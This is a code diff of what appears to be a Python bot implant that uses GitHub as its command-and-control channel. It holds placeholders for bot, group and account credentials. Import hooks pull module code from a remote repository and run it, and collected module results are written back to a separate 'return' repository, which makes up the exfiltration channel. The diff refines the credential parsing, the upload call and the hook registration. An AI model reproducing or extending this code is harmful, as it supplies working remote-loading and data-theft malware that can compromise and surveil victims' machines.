@@ -17,11 +17,11 @@ try:
 except ImportError:
     from urllib.request import urlopen, Request
 
-_id = '%s'
-_group='%s'
-_baseAcc='%s'
-_retAcc='%s'
-_config = '%s.json' % _id
+_id = '{bot_id}'
+_group='{bot_group}'
+_baseAcc='{base_account}'
+_retAcc='{ret_account}'
+_config = 'config/%s.json' % _group
 data_path = 'data/%s/' % _id
 _modules = []
 configured = False
@@ -49,13 +49,13 @@ def _request(method='GET', uri=None, data=None, headers=None):
 def auth_reqest(user, password, method='GET', uri=None,
                 data=None, headers=None):
     auth_hash = ':'.join((user, password)).encode('base64').strip()
-    headers = headers or {{}}
+    headers = headers or dict()
     headers.update({'Authorization': 'Basic ' + auth_hash})
     return _request(method=method, uri=uri, data=data, headers=headers)
 
 
 def token_request(token, method='GET', uri=None, data=None, headers=None):
-    headers = headers or {{}}
+    headers = headers or dict()
     headers.update({'Authorization': 'token ' + token})
     return _request(method=method, uri=uri, data=data, headers=headers)
 
@@ -123,8 +123,8 @@ def get_raw(path, owner=None, repo=None, branch='master'):
 
 
 def get_file_contents(filepath):
-    gu = _baseAcc.split(':')[0]
-    gr = _baseAcc.split('@')[1]
+    gu = _baseAcc.split('$$')[0]
+    gr = _baseAcc.split('$$')[-1]
     return get_raw(filepath, gu, gr)
 
 
@@ -141,9 +141,10 @@ def get_config():
 
 
 def store_module_result(data):
-    gh = _retAcc.
+    gu, gp, gr = _retAcc.split('$$')
     remote_path = 'data/%s/%d.data' % (_id, random.randint(1000, 100000))
-    repo.create_file(remote_path, "commit message", base64.b64encode(data))
+    # repo.create_file(remote_path, "commit message", base64.b64encode(data))
+    put(gu, gp, gr, remote_path, data)
 
     return
 
@@ -159,7 +160,7 @@ class GitImporter(object):
             new_library = get_file_contents('modules/%s' % fullname)
 
             if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
+                self.current_module_code = new_library
                 return self
 
         return None
@@ -268,6 +269,7 @@ class GHFinder(object):
                 files = [x for x in files if not x.endswith('.dll')]
 
             return files
+
         imp.acquire_lock()
         selected = None
         try:
@@ -316,13 +318,13 @@ class GHFinder(object):
             imp.release_lock()
 
 
-sys.meta_path = [GitImporter()]
+# sys.meta_path = [GitImporter()]
 sys.path_hooks.append(GHFinder)
 sys.path.append('GH://')
 # sys.path.append('gh://')
 
-sys.path_hooks.append(GitImporter())
-sys.path.append('GH://')
+# sys.path_hooks.append(GitImporter())
+# sys.path.append('GH://')
 # sys.path.append('gh://')
 # sys.meta_path = [GitImporter()]
 
